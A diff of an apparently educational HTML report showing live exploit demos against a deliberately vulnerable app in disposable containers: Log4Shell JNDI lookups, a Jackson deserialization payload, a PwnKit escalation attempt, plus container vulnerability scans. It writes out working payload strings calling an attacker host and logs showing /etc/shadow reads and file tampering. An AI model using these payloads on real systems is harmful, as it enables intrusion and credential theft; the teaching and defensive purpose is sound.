@@ -89,8 +89,8 @@
   </nav>
   <main>
     <h1>Vulnerable App — Live Exploit Demos</h1>
-    <p class="subtitle">Generated 2026-08-21 18:09 UTC from a real run of the exploit demos below —
-      not a scripted transcript. <a href="https://github.com/johanjanssen/Keep-Up-To-Date/actions/runs/32511681622">View the workflow run &rarr;</a></p>
+    <p class="subtitle">Generated 2026-08-25 12:54 UTC from a real run of the exploit demos below —
+      not a scripted transcript. <a href="https://github.com/johanjanssen/Keep-Up-To-Date/actions/runs/32849999778">View the workflow run &rarr;</a></p>
     <p class="warn">⚠️ Every exploit here runs against a deliberately vulnerable app, in
       throwaway containers, on a GitHub Actions runner that's destroyed right after the job
       finishes. Nothing shown targets, or is safe to point at, a real system.</p>
@@ -98,10 +98,23 @@
 <h2>💀 Demo 1 — Log4Shell: From Search Query to Remote Code Execution</h2>
 <p><strong>Scenario:</strong> A developer builds a product search API. They log the search query —<br />
 standard practice. The application uses <code>log4j-core 2.14.1</code> (Dec 2021, before the patch).</p>
+<h3>🔎 Baseline — live <code>docker exec</code> against the container this job is running right now</h3>
+<p>Not a log excerpt — these commands run against the actual <code>vuln-app</code> container, on the<br />
+actual GitHub Actions runner, before any exploit fires:</p>
+<pre><code class="language-console">$ docker exec vuln-app id   # On: victim's server
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<pre><code class="language-console">$ docker exec vuln-app java -version   # On: victim's server
+openjdk version &quot;11.0.32&quot; 2026-07-21
+OpenJDK Runtime Environment Temurin-11.0.32+9 (build 11.0.32+9)
+OpenJDK 64-Bit Server VM Temurin-11.0.32+9 (build 11.0.32+9, mixed mode, sharing)
+</code></pre>
+<p>Confirmed live: the app really runs as <strong>root</strong>, on the JVM this image ships —<br />
+exactly the combination that lets Log4Shell go all the way to full compromise.</p>
 <hr />
 <h3>🏢 Victim's server — normal operation</h3>
 <p>A legitimate user searches for products:</p>
-<pre><code class="language-console">$ curl &quot;http://victim:8080/api/products/search?q=shirt&quot;
+<pre><code class="language-console">$ curl &quot;http://victim:8080/api/products/search?q=shirt&quot;   # On: legitimate user's machine
 </code></pre>
 <pre><code class="language-json">{
     &quot;results&quot;: [
@@ -121,7 +134,7 @@ standard practice. The application uses <code>log4j-core 2.14.1</code> (Dec 2021
 <hr />
 <h3>💀 Attacker's machine — sending the exploit</h3>
 <p>The attacker replaces the search term with a JNDI lookup expression:</p>
-<pre><code class="language-console">$ curl &quot;http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwned}&quot;
+<pre><code class="language-console">$ curl &quot;http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwned}&quot;   # On: attacker's machine
 </code></pre>
 <pre><code class="language-json">{
     &quot;results&quot;: [],
@@ -140,30 +153,26 @@ scenes though:</p>
 <li>The victim downloads and executes the attacker's malicious Java class</li>
 <li><strong>The attacker now has Remote Code Execution inside the victim's container</strong></li>
 </ol>
+<p>Watch it happen live, on both machines, in the next step:</p>
 <hr />
-<h3>📡 Attacker's server — what the attacker sees</h3>
-<p>The attacker's LDAP + HTTP server received connections from the victim:</p>
-<pre><code class="language-console">$ docker logs callback   # (filtered to the interesting lines)
-🎯 LDAP lookup received! Base DN: log4shell-pwned
-   Victim is vulnerable to Log4Shell — sending malicious class reference...
-   Victim will now download and execute the malicious class!
-  📦 HTTP FILE SERVER — Serving malicious class to victim
-  File:    /exploit/ExploitPayload.class (3899 bytes)
-</code></pre>
-<h3>🎯 Inside the victim's container — the exploit ran</h3>
-<p>The attacker's code executed inside the victim. Here's what it did:</p>
-<pre><code class="language-console">$ docker logs vuln-app   # (filtered to the interesting lines)
-  REMOTE CODE EXECUTION ACHIEVED ON VICTIM
-  [1/4] Reconnaissance — who am I, where am I?
-        User:     uid=0(root) gid=0(root) groups=0(root)
-        Hostname: b68efe708b88
-        OS:       Ubuntu 22.04.5 LTS
-  [2/4] Stealing secrets...
-        /etc/shadow (password hashes):
-  [3/4] Exfiltrating data to attacker server...
-  [4/4] Privilege escalation...
-        Already root (this container runs the app as root) — nothing to escalate.
-        ✓ Modified /etc/motd (login message)
+<h3>⏳ Watching the attack unfold in real time</h3>
+<p>Polling <code>docker logs</code> on both running containers, once a second, printing each<br />
+milestone the instant it appears — the real order of events, not a canned<br />
+transcript. Each milestone shows two lines: the <strong>raw line the container actually<br />
+printed</strong> (proof this is really happening), then what it means:</p>
+<pre><code class="language-console">[+01s] callback: 🎯 LDAP lookup received! Base DN: log4shell-pwned
+[+01s]   └─ 📡 [callback] attacker's LDAP server received the JNDI callback
+[+01s] callback: 📦 HTTP FILE SERVER — Serving malicious class to victim
+[+01s]   └─ 📦 [callback] attacker's HTTP file server served the malicious class
+[+01s] vuln-app: REMOTE CODE EXECUTION ACHIEVED ON VICTIM
+[+01s]   └─ 💥 [vuln-app] victim loaded the attacker's Java class — RCE confirmed
+[+01s] vuln-app: [1/4] Reconnaissance — who am I, where am I?
+[+01s]   └─ 🔎 [vuln-app] payload starts recon — id, hostname, OS
+[+01s] vuln-app: /etc/shadow (password hashes):
+[+01s]   └─ 🔓 [vuln-app] payload read /etc/shadow — proves root access
+[+01s] vuln-app: ✓ Modified /etc/motd (login message)
+[+01s]   └─ ✍️ [vuln-app] payload wrote to /etc/motd — proof of persistence
+[+01s] 🏁 payload finished executing inside the victim container
 </code></pre>
 <h3>💡 Key takeaway</h3>
 <blockquote>
@@ -185,11 +194,11 @@ Application uses <code>jackson-databind 2.13.4.1</code>.</p>
 <h3>🏢 Victim's server — normal use</h3>
 <p>A legitimate service pushes a profile update (already in the wire format this stack always<br />
 uses — this is not attacker-crafted, it's what <code>enableDefaultTyping()</code> produces automatically):</p>
-<pre><code class="language-console">$ curl -X POST &quot;http://victim:8080/api/users/import&quot; -d '[&quot;java.util.LinkedHashMap&quot;, {&quot;name&quot;:&quot;Alice&quot;,&quot;email&quot;:&quot;alice@conf.io&quot;}]'
+<pre><code class="language-console">$ curl -X POST &quot;http://victim:8080/api/users/import&quot; -d '[&quot;java.util.LinkedHashMap&quot;, {&quot;name&quot;:&quot;Alice&quot;,&quot;email&quot;:&quot;alice@conf.io&quot;}]'   # On: legitimate internal service
 </code></pre>
 <pre><code class="language-json">{
-    &quot;status&quot;: &quot;imported&quot;,
-    &quot;name&quot;: &quot;Alice&quot;
+    &quot;name&quot;: &quot;Alice&quot;,
+    &quot;status&quot;: &quot;imported&quot;
 }
 </code></pre>
 <hr />
@@ -200,30 +209,45 @@ class inside an otherwise normal-looking wrapped profile. The top-level wrapper<
 (<code>java.util.LinkedHashMap</code>) is exactly what a legitimate request looks like. Only the<br />
 <code>email</code> field's class was swapped — <code>enableDefaultTyping()</code> applies the same "trust the<br />
 client's class name" rule recursively to every nested value, not just the top level.</p>
-<pre><code class="language-console">$ curl -X POST &quot;http://victim:8080/api/users/import&quot; -d '[&quot;java.util.LinkedHashMap&quot;, {&quot;name&quot;:&quot;Alice&quot;,&quot;email&quot;:[&quot;java.net.URL&quot;,&quot;http://attacker:9999/jackson-rce-proof&quot;]}]'
+<pre><code class="language-console">$ curl -X POST &quot;http://victim:8080/api/users/import&quot; -d '[&quot;java.util.LinkedHashMap&quot;, {&quot;name&quot;:&quot;Alice&quot;,&quot;email&quot;:[&quot;java.net.URL&quot;,&quot;http://attacker:9999/jackson-rce-proof&quot;]}]'   # On: attacker's machine
 </code></pre>
 <pre><code class="language-json">{
-    &quot;status&quot;: &quot;imported&quot;,
-    &quot;name&quot;: &quot;Alice&quot;
+    &quot;name&quot;: &quot;Alice&quot;,
+    &quot;status&quot;: &quot;imported&quot;
 }
 </code></pre>
-<p>The application's own logs already flagged it (defensive type-introspection logging, not a hack):</p>
-<pre><code class="language-console">$ docker logs vuln-app | grep '\[import\]'
-2026-08-21T18:08:54.739Z  INFO  1 --- [nio-8080-exec-3] HelloConferenceController                : [import] field &quot;name&quot; = Alice (String)
-2026-08-21T18:08:54.739Z  INFO  1 --- [nio-8080-exec-3] HelloConferenceController                : [import] field &quot;email&quot; = alice@conf.io (String)
-2026-08-21T18:08:54.797Z  INFO  1 --- [nio-8080-exec-4] HelloConferenceController                : [import] Received user-import request (123 bytes)
-2026-08-21T18:08:54.804Z  INFO  1 --- [nio-8080-exec-4] HelloConferenceController                : [import] Jackson resolved the request body to runtime type: java.util.LinkedHashMap
-2026-08-21T18:08:54.805Z  INFO  1 --- [nio-8080-exec-4] HelloConferenceController                : [import] field &quot;name&quot; = Alice (String)
-2026-08-21T18:08:54.805Z  WARN  1 --- [nio-8080-exec-4] HelloConferenceController                : [import] field &quot;email&quot; deserialized as java.net.URL — attacker-controlled type, not an expected profile field type!
+<hr />
+<h3>🎯 Victim's server — its own logs already flagged it</h3>
+<p>Not a hack — defensive type-introspection logging the application does on every<br />
+<code>/api/users/import</code> call:</p>
+<pre><code class="language-console">$ docker logs vuln-app | grep '\[import\]'   # On: victim's server
+2026-08-25T12:53:40.694Z  INFO  1 --- [nio-8080-exec-2] HelloConferenceController                : [import] field &quot;name&quot; = Alice (String)
+2026-08-25T12:53:40.695Z  INFO  1 --- [nio-8080-exec-2] HelloConferenceController                : [import] field &quot;email&quot; = alice@conf.io (String)
+2026-08-25T12:53:40.769Z  INFO  1 --- [nio-8080-exec-4] HelloConferenceController                : [import] Received user-import request (123 bytes)
+2026-08-25T12:53:40.776Z  INFO  1 --- [nio-8080-exec-4] HelloConferenceController                : [import] Jackson resolved the request body to runtime type: java.util.LinkedHashMap
+2026-08-25T12:53:40.777Z  INFO  1 --- [nio-8080-exec-4] HelloConferenceController                : [import] field &quot;name&quot; = Alice (String)
+2026-08-25T12:53:40.777Z  WARN  1 --- [nio-8080-exec-4] HelloConferenceController                : [import] field &quot;email&quot; deserialized as java.net.URL — attacker-controlled type, not an expected profile field type!
+</code></pre>
+<h3>📡 Attacker's own dashboard — checked live, right now</h3>
+<p><code>java.net.URL</code> doesn't connect on construction, so this specific payload never reaches<br />
+the attacker's server — the dashboard should still read empty. Proving that live, not<br />
+just asserting it:</p>
+<pre><code class="language-console">$ curl &quot;http://attacker:9999/dashboard&quot;   # On: attacker's machine
+</code></pre>
+<pre><code class="language-json">{
+    &quot;callbacks&quot;: [],
+    &quot;total_callbacks&quot;: 0
+}
 </code></pre>
 <h3>💡 Key takeaway</h3>
 <blockquote>
 <p><strong>The <code>email</code> field deserialized as <code>java.net.URL</code>, not <code>String</code> — proof the attacker<br />
 controlled which Java class got instantiated,</strong> hidden inside a request that otherwise<br />
 looked exactly like normal internal traffic.</p>
-<p>In this demo we used <code>java.net.URL</code> (harmless — it doesn't connect on construction). In a<br />
-real attack, the attacker uses gadget classes like <code>JdbcRowSetImpl</code> (triggers JNDI → RCE)<br />
-or <code>TemplatesImpl</code> (executes arbitrary bytecode) — same result as Log4Shell.</p>
+<p>In this demo we used <code>java.net.URL</code> (harmless — it doesn't connect on construction, which<br />
+is exactly why the attacker's dashboard above is still empty). In a real attack, the<br />
+attacker uses gadget classes like <code>JdbcRowSetImpl</code> (triggers JNDI → RCE) or <code>TemplatesImpl</code><br />
+(executes arbitrary bytecode) — same result as Log4Shell, and the dashboard would not stay empty.</p>
 <p><strong>Fix:</strong> Never use <code>enableDefaultTyping()</code>. Use <code>@JsonTypeInfo</code> with an explicit allow-list<br />
 instead. Update jackson-databind to the latest version.</p>
 </blockquote>
@@ -236,40 +260,36 @@ does AFTER getting code execution. Two images compared:<br />
 - 🔴 <strong>Root image</strong> — runs as root, old OS, has gcc/curl/wget<br />
 - 🟢 <strong>Safe image</strong> — runs as non-root, modern OS, no extra tools</p>
 <hr />
+<h3>🔎 Baseline — live <code>docker exec</code> against the ROOT container, before the exploit fires</h3>
+<pre><code class="language-console">$ docker exec vuln-app id   # On: victim's server (ROOT image)
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<pre><code class="language-console">$ docker exec vuln-app ls -l /etc/shadow   # On: victim's server (ROOT image)
+-rw-r----- 1 root shadow 607 Aug 25 12:52 /etc/shadow
+</code></pre>
+<p>Confirmed live: the app runs as <strong>root</strong> and can already read <code>/etc/shadow</code> —<br />
+before a single exploit request has been sent.</p>
+<hr />
 <h3>🔴 Attack on ROOT image</h3>
-<pre><code class="language-console">$ curl -o /dev/null -w '%{http_code}\n' &quot;http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwned}&quot;
+<pre><code class="language-console">$ curl -o /dev/null -w '%{http_code}\n' &quot;http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwned}&quot;   # On: attacker's machine
 200
 </code></pre>
-<h4>🎯 What the attacker's code did inside the ROOT container:</h4>
-<pre><code class="language-console">$ docker logs vuln-app   # (filtered to the interesting lines)
-2026-08-21T18:08:45.374Z  INFO  1 --- [           main] HelloConferenceApplication               : Starting HelloConferenceApplication v0.0.1-SNAPSHOT using Java 11.0.31 on 0fc286ecbe22 with PID 1 (/app/app.jar started by root in /app)
-2026-08-21T18:08:45.391Z  INFO  1 --- [           main] HelloConferenceApplication               : No active profile set, falling back to 1 default profile: &quot;default&quot;
-2026-08-21 18:08:46.910  INFO 1 --- [           main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
-2026-08-21 18:08:46.913  INFO 1 --- [           main] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.83]
-2026-08-21 18:08:47.014  INFO 1 --- [           main] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext
-2026-08-21T18:08:47.544Z  INFO  1 --- [           main] HelloConferenceApplication               : Started HelloConferenceApplication in 2.722 seconds (JVM running for 4.13)
-2026-08-21 18:08:47.628  INFO 1 --- [nio-8080-exec-1] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring DispatcherServlet 'dispatcherServlet'
-2026-08-21T18:08:47.714Z  INFO  1 --- [nio-8080-exec-3] HelloConferenceController                : [search] Received request
-  REMOTE CODE EXECUTION ACHIEVED ON VICTIM
-  [1/4] Reconnaissance — who am I, where am I?
-        User:     uid=0(root) gid=0(root) groups=0(root)
-        Hostname: 0fc286ecbe22
-        OS:       Ubuntu 22.04.5 LTS
-  [2/4] Stealing secrets...
-        /etc/shadow (password hashes):
-        root:*:20675:0:99999:7:::
-  [3/4] Exfiltrating data to attacker server...
-  [4/4] Privilege escalation...
-        Already root (this container runs the app as root) — nothing to escalate.
-        ✓ Modified /etc/motd (login message)
-        ✓ Could install SSH keys, create users, pivot to other systems
-2026-08-21 18:08:47,873 http-nio-8080-exec-3 WARN Error looking up JNDI resource [ldap://host.docker.internal:1389/log4shell-pwned]. javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: class ExploitPayload cannot be cast to class javax.naming.spi.ObjectFactory (ExploitPayload is in unnamed module of loader java.net.FactoryURLClassLoader @7d37d47d; javax.naming.spi.ObjectFactory is in module java.naming of loader 'bootstrap')]; remaining name 'log4shell-pwned'
-2026-08-21T18:08:47.714Z  INFO  1 --- [nio-8080-exec-3] HelloConferenceController                : Product search query: ${jndi:ldap://host.docker.internal:1389/log4shell-pwned}
-2026-08-21T18:08:47.887Z  INFO  1 --- [nio-8080-exec-3] HelloConferenceController                : [search] Returning 0 match(es)
-</code></pre>
-<h4>📡 Attacker's server received the stolen data:</h4>
-<pre><code class="language-console">$ docker logs callback | grep -A5 stolen-data
-
+<h4>⏳ Watching the ROOT-image compromise unfold in real time</h4>
+<p>Same polling technique as Demo 1 — each milestone shows the raw line the container<br />
+actually printed, then what it means:</p>
+<pre><code class="language-console">[+01s] callback: 🎯 LDAP lookup received! Base DN: log4shell-pwned
+[+01s]   └─ 📡 [callback] attacker's LDAP server received the JNDI callback
+[+01s] callback: 📦 HTTP FILE SERVER — Serving malicious class to victim
+[+01s]   └─ 📦 [callback] attacker's HTTP file server served the malicious class
+[+01s] vuln-app: REMOTE CODE EXECUTION ACHIEVED ON VICTIM
+[+01s]   └─ 💥 [vuln-app] victim loaded the attacker's Java class — RCE confirmed
+[+01s] vuln-app: /etc/shadow (password hashes):
+[+01s]   └─ 🔓 [vuln-app] payload read /etc/shadow — proves root access
+[+01s] vuln-app: Already root (this container runs the app as root) — nothing to escalate.
+[+01s]   └─ 👑 [vuln-app] payload confirms it is already root — nothing left to escalate
+[+01s] vuln-app: ✓ Modified /etc/motd (login message)
+[+01s]   └─ ✍️ [vuln-app] payload wrote to /etc/motd — proof of persistence
+[+01s] 🏁 payload finished executing inside the victim container
 </code></pre>
 <blockquote>
 <p><strong>Impact on ROOT image:</strong> The attacker read <code>/etc/shadow</code> (password hashes),<br />
@@ -278,19 +298,30 @@ modified system files, and exfiltrated data. Full server compromise from a singl
 <hr />
 <h3>🟢 Same attack on SAFE image</h3>
 <p>Same exploit, same application JAR, but different container configuration:</p>
-<pre><code class="language-console">$ curl -o /dev/null -w '%{http_code}\n' &quot;http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwned}&quot;   # exact same command as above
+<pre><code class="language-console">$ docker exec vuln-app id   # On: victim's server (SAFE image)
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev)
+</code></pre>
+<pre><code class="language-console">$ curl -o /dev/null -w '%{http_code}\n' &quot;http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwned}&quot;   # On: attacker's machine — exact same command as above
 200
 </code></pre>
-<h4>Result on SAFE image:</h4>
-<pre><code class="language-console">$ docker logs vuln-app | tail -8
-2026-08-21 18:08:56.168  INFO 1 --- [           main] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.83]
-2026-08-21 18:08:56.223  INFO 1 --- [           main] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext
-2026-08-21T18:08:56.534Z  INFO  1 --- [           main] HelloConferenceApplication               : Started HelloConferenceApplication in 1.402 seconds (JVM running for 2.203)
-2026-08-21 18:08:58.396  INFO 1 --- [nio-8080-exec-1] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring DispatcherServlet 'dispatcherServlet'
-2026-08-21T18:08:58.450Z  INFO  1 --- [nio-8080-exec-2] HelloConferenceController                : [search] Received request
-2026-08-21T18:08:58.450Z  INFO  1 --- [nio-8080-exec-2] HelloConferenceController                : Product search query: Reference Class Name: ExploitPayload
+<h4>⏳ Watching for 5s — does the attacker's Java class load this time?</h4>
+<pre><code class="language-console">[+01s] vuln-app: (nothing yet)
+[+02s] vuln-app: (nothing yet)
+[+03s] vuln-app: (nothing yet)
+[+04s] vuln-app: (nothing yet)
+[+05s] vuln-app: (nothing yet)
+[+05s] ✅ no RCE marker ever appeared — the class never loaded
+</code></pre>
+<p>Actual container output confirming the request was received and handled normally:</p>
+<pre><code class="language-console">$ docker logs vuln-app | tail -8   # On: victim's server (SAFE image)
+2026-08-25 12:54:08.263  INFO 1 --- [           main] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.83]
+2026-08-25 12:54:08.315  INFO 1 --- [           main] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext
+2026-08-25T12:54:08.595Z  INFO  1 --- [           main] HelloConferenceApplication               : Started HelloConferenceApplication in 1.345 seconds (JVM running for 2.147)
+2026-08-25 12:54:10.517  INFO 1 --- [nio-8080-exec-1] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring DispatcherServlet 'dispatcherServlet'
+2026-08-25T12:54:10.642Z  INFO  1 --- [nio-8080-exec-2] HelloConferenceController                : [search] Received request
+2026-08-25T12:54:10.642Z  INFO  1 --- [nio-8080-exec-2] HelloConferenceController                : Product search query: Reference Class Name: ExploitPayload
 
-2026-08-21T18:08:58.468Z  INFO  1 --- [nio-8080-exec-2] HelloConferenceController                : [search] Returning 0 match(es)
+2026-08-25T12:54:10.658Z  INFO  1 --- [nio-8080-exec-2] HelloConferenceController                : [search] Returning 0 match(es)
 </code></pre>
 <blockquote>
 <p><strong>The JNDI lookup is blocked.</strong> Java 25 defaults <code>com.sun.jndi.ldap.object.trustURLCodebase=false</code>,<br />
@@ -370,7 +401,7 @@ carries the SUID bit (<code>rws</code>) — it runs as root no matter which user
 <pre><code class="language-bash"># On: Attacker's machine
 curl &quot;http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwnkit}&quot;
 </code></pre>
-<p>Sent live at <code>18:08:41 UTC</code> from this runner:</p>
+<p>Sent live at <code>12:53:27 UTC</code> from this runner:</p>
 <pre><code class="language-console">$ curl -w '%{http_code}\n' &quot;http://victim:8080/api/products/search?q=${jndi:ldap://attacker:1389/pwnkit}&quot;
 200
 </code></pre>
@@ -399,26 +430,26 @@ printed</strong> (proof this is really happening), then what it means:</p>
 it's <code>docker exec</code> reading the container's actual <code>/tmp</code> right now:</p>
 <pre><code class="language-console">$ docker exec vuln-app ls -la /tmp
 total 56
-drwxrwxrwt 1 root    root     4096 Aug 21 18:08 .
-drwxr-xr-x 1 root    root     4096 Aug 21 18:08 ..
-drwxr-xr-x 3 appuser appuser  4096 Aug 21 18:08 GCONV_PATH=.
-drwxr-xr-x 2 appuser appuser  4096 Aug 21 18:08 hsperfdata_appuser
-drwxr-xr-x 1 root    root     4096 Aug 18 01:14 hsperfdata_root
-drwxr-xr-x 2 appuser appuser  4096 Aug 21 18:08 lol
--rwxr-xr-x 1 appuser appuser 16392 Aug 21 18:08 pwnkit
--rw-r--r-- 1 appuser appuser  2305 Aug 21 18:08 pwnkit.c
-drwx------ 3 appuser appuser  4096 Aug 21 18:08 tomcat.8080.2767627061148285207
-drwx------ 2 appuser appuser  4096 Aug 21 18:08 tomcat-docbase.8080.6237016215702771017
+drwxrwxrwt 1 root    root     4096 Aug 25 12:53 .
+drwxr-xr-x 1 root    root     4096 Aug 25 12:53 ..
+drwxr-xr-x 3 appuser appuser  4096 Aug 25 12:53 GCONV_PATH=.
+drwxr-xr-x 2 appuser appuser  4096 Aug 25 12:53 hsperfdata_appuser
+drwxr-xr-x 1 root    root     4096 Aug 21 18:23 hsperfdata_root
+drwxr-xr-x 2 appuser appuser  4096 Aug 25 12:53 lol
+-rwxr-xr-x 1 appuser appuser 16392 Aug 25 12:53 pwnkit
+-rw-r--r-- 1 appuser appuser  2305 Aug 25 12:53 pwnkit.c
+drwx------ 3 appuser appuser  4096 Aug 25 12:53 tomcat.8080.10109178503980629990
+drwx------ 2 appuser appuser  4096 Aug 25 12:53 tomcat-docbase.8080.8479366766289876542
 </code></pre>
 <pre><code class="language-console">$ docker exec vuln-app stat /tmp/pwnkit
   File: /tmp/pwnkit
   Size: 16392       Blocks: 40         IO Block: 4096   regular file
-Device: 33h/51d Inode: 9202074     Links: 1
+Device: 33h/51d Inode: 9437353     Links: 1
 Access: (0755/-rwxr-xr-x)  Uid: ( 1000/ appuser)   Gid: ( 1000/ appuser)
-Access: 2026-08-21 18:08:41.379741803 +0000
-Modify: 2026-08-21 18:08:41.379404591 +0000
-Change: 2026-08-21 18:08:41.379427073 +0000
- Birth: 2026-08-21 18:08:41.365741718 +0000
+Access: 2026-08-25 12:53:28.117296074 +0000
+Modify: 2026-08-25 12:53:28.117071049 +0000
+Change: 2026-08-25 12:53:28.117089103 +0000
+ Birth: 2026-08-25 12:53:28.103296051 +0000
 </code></pre>
 <pre><code class="language-console">$ docker exec vuln-app id   # (the long-lived container process — still appuser)
 uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
@@ -427,7 +458,7 @@ uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
 <pre><code class="language-console">$ docker logs vuln-app   # (filtered to the interesting lines)
   REMOTE CODE EXECUTION ACHIEVED ON VICTIM
         User:     uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
-        Hostname: a45728600e21
+        Hostname: d23972d93ed0
         OS:       Ubuntu 22.04.5 LTS
         /etc/shadow: Permission denied (not root)
   [4/4] Privilege escalation...
@@ -436,6 +467,7 @@ uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
 Step 1: Checking for pkexec...
 FOUND: /usr/bin/pkexec is SUID root
 Step 2: Checking for gcc...
+pkexec --version |
 FOUND: gcc available
 (if this works, you'll see a SECOND 'Current user' line below showing uid=0/root;
  if pkexec is patched, it prints its own usage/error message instead and nothing escalates)
@@ -443,10 +475,9 @@ FOUND: gcc available
 Current user (before escalation attempt): uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
 FOUND: pkexec SUID root
 Escalating...
-pkexec --version |
+See the pkexec manual page for more details.
         Regardless of the outcome above, without root the attacker still has:
         ✓ Read access to application data, source code, configs
-See the pkexec manual page for more details.
         ✓ Outbound network connections (seen by the callback server)
         ✓ Ability to scan the internal network
 </code></pre>
@@ -479,26 +510,26 @@ different base images and configurations:</p>
 <tbody>
 <tr>
 <td>Total CVEs</td>
-<td>3095</td>
-<td>3092</td>
-<td>152</td>
+<td>3072</td>
+<td>3069</td>
+<td>154</td>
 </tr>
 <tr>
 <td>CRITICAL</td>
-<td>12</td>
-<td>12</td>
+<td>13</td>
+<td>13</td>
 <td>7</td>
 </tr>
 <tr>
 <td>HIGH</td>
-<td>130</td>
-<td>130</td>
+<td>215</td>
+<td>215</td>
 <td>47</td>
 </tr>
 <tr>
 <td>Image Size</td>
-<td>446 MB</td>
-<td>441 MB</td>
+<td>445 MB</td>
+<td>440 MB</td>
 <td>339 MB</td>
 </tr>
 <tr>
@@ -529,7 +560,7 @@ Report Summary
 ┌──────────────────────────────┬────────┬─────────────────┬─────────┐
 │            Target            │  Type  │ Vulnerabilities │ Secrets │
 ├──────────────────────────────┼────────┼─────────────────┼─────────┤
-│ vuln-app:root (ubuntu 22.04) │ ubuntu │       96        │    -    │
+│ vuln-app:root (ubuntu 22.04) │ ubuntu │       182       │    -    │
 ├──────────────────────────────┼────────┼─────────────────┼─────────┤
 │ app/app.jar                  │  jar   │       46        │    -    │
 └──────────────────────────────┴────────┴─────────────────┴─────────┘
@@ -549,7 +580,7 @@ To disable this notice, set the TRIVY_DISABLE_VEX_NOTICE environment variable.
 
 vuln-app:root (ubuntu 22.04)
 ============================
-Total: 96 (HIGH: 91, CRITICAL: 5)
+Total: 182 (HIGH: 176, CRITICAL: 6)
 
 ┌────────────────┬────────────────┬──────────┬──────────┬───────────────────┬───────────────┬──────────────────────────────────────────────────────────────┐
 │    Library     │ Vulnerability  │ Severity │  Status  │ Installed Version │ Fixed Version │                            Title                             │
@@ -561,6 +592,9 @@ Total: 96 (HIGH: 91, CRITICAL: 5)
 │                │ CVE-2026-53398 │          │          │                   │               │ kernel: NFSD: Fix SECINFO_NO_NAME decode error cleanup       │
 │                │                │          │          │                   │               │ https://avd.aquasec.com/nvd/cve-2026-53398                   │
 │                ├────────────────┤          │          │                   ├───────────────┼──────────────────────────────────────────────────────────────┤
+│                │ CVE-2026-63940 │          │          │                   │               │ kernel: KVM: SEV: Ignore Port I/O requests of length '0'     │
+│                │                │          │          │                   │               │ https://avd.aquasec.com/nvd/cve-2026-63940                   │
+│                ├────────────────┤          │          │                   ├───────────────┼──────────────────────────────────────────────────────────────┤
 │                │ CVE-2026-64535 │          │          │                   │               │ kernel: nvmet-tcp: Fix potential UAF when ddgst mismatch     │
 │                │                │          │          │                   │               │ https://avd.aquasec.com/nvd/cve-2026-64535                   │
 │                ├────────────────┤          │          │                   ├───────────────┼──────────────────────────────────────────────────────────────┤
@@ -570,9 +604,6 @@ Total: 96 (HIGH: 91, CRITICAL: 5)
 │                ├────────────────┤          │          │                   ├───────────────┼──────────────────────────────────────────────────────────────┤
 │                │ CVE-2026-74394 │          │          │                   │               │ kernel: RDMA/srpt: fix integer overflow in immediate data    │
 │                │                │          │          │                   │               │ length check                                                 │
-│                │                │          │          │                   │               │ https://avd.aquasec.com/nvd/cve-2026-74394                   │
-│                ├────────────────┼──────────┤          │                   ├───────────────┼──────────────────────────────────────────────────────────────┤
-│                │ CVE-2022-49359 │ HIGH     │          │                   │               │ kernel: drm/panfrost: Job should reference MMU not file_priv │
 </code></pre>
 <h3>🟢 Scan — vuln-app:safe</h3>
 <pre><code class="language-console">$ trivy image --severity CRITICAL,HIGH vuln-app:safe
